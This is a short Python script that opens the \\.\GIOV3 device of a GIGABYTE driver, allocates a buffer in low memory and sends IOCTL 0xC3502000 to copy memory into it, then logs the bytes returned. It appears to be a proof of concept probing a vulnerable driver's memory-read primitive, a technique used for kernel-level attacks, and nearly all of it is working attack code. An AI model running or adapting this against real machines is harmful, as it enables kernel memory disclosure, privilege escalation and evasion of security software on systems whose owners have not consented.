import ctypes, struct
log = open(r"F:\dsh\32\Asgard_Polygon-main\gdrv_rw.log", "w", encoding="utf-8")
k = ctypes.WinDLL("kernel32", use_last_error=True)
h = k.CreateFileW(r"\\.\GIOV3", 0xC0000000, 0, None, 3, 0, None)
log.write("open -> %s err=%d\n" % (h, ctypes.get_last_error()))
if h not in (0xffffffffffffffff, -1):
    # allocate a destination buffer inside the low 4GB (dest32 in the ioctl is a 32-bit pointer)
    buf = k.VirtualAlloc(ctypes.c_void_p(0x10000000), 0x1000, 0x3000, 0x04)
    log.write("lowbuf = 0x%x err=%d\n" % (buf, ctypes.get_last_error()))
    if buf:
        inp = struct.pack("<QII", 0x1000, 0x100, buf & 0xFFFFFFFF)
        ret = ctypes.c_ulong(0)
        ok = k.DeviceIoControl(ctypes.c_void_p(h), 0xC3502000, inp, len(inp), None, 0, ctypes.byref(ret), None)
        log.write("IOCTL 0xC3502000 ok=%s err=%d\n" % (bool(ok), ctypes.get_last_error()))
        data = ctypes.string_at(buf, 0x40)
        log.write("data[0:64]=" + data.hex() + "\n")
    k.CloseHandle(ctypes.c_void_p(h))
log.close()
